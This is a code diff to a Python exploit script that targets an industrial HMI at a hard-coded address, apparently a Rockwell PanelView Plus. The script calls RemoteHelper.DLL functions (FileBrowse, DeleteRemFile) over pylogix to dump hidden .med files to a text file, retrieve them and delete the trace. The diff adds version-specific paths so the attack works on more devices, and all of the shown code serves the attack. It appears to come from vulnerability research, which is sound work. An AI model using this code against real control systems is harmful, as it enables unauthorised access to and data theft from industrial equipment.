@@ -187,17 +187,20 @@ def get_med(plc):
 
 with pylogix.PLC("192.168.1.12") as comm:
 
-    init_file = "\\Windows\\RemoteHelper.DLL\0FileBrowse\0\\Temp\\~MER.00\\*.med::\\Application Data\\Rockwell Software\\RSViewME\\Runtime\\DillyDilly.txt\0"
-    file_location = "\\Application Data\\Rockwell Software\\RSViewME\\Runtime\\DillyDilly.txt\0"
-    uninit_file = "\\Windows\\RemoteHelper.DLL\0DeleteRemFile\0\\Application Data\\Rockwell Software\\RSViewME\\Runtime\\DillyDilly.txt\0"
-
-
     response = get_platform_version(comm)
-    print(response)
+    if response.Value[0] == 5:
+        helper = "\\Storage Card\\Rockwell Software\\RSViewME\\RemoteHelper.DLL\0"
+        output_location = "\\Storage Card\\Rockwell Software\\RSViewME\\Runtime\\DillyDilly.txt\0"
+    else:
+        helper = "\\Windows\\RemoteHelper.DLL\0"
+        output_location = "\\Application Data\\Rockwell Software\\RSViewME\\Runtime\\DillyDilly.txt\0"
+
+    init_file = helper + "FileBrowse\0\\Temp\\~MER.00\\*.med::" + output_location
+    uninit_file = helper + "DeleteRemFile\0" + output_location
 
     response = pv_test(comm, 0x50, 0x04fd, init_file)
     if response.Status == "Success":
-        response = create_file(comm, file_location)
+        response = create_file(comm, output_location)
 
     if response.Status == "Success":
         response = get_med(comm)
